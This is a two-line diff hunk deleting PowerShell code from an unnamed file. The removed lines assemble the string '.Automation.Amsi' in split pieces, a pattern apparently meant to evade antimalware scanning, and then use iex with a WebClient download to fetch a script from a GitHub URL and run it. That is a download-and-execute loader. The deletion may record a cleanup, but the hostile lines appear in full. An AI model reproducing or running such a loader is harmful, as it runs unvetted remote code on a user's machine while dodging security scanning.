@@ -1,2 +1,0 @@
-$data0 = ".Automation." + "Am" + "si"
-iex(new-object net.webclient).downloadstring('https://github.com/deverisc/arithmetic/edit/main/arithmetic002.txt')
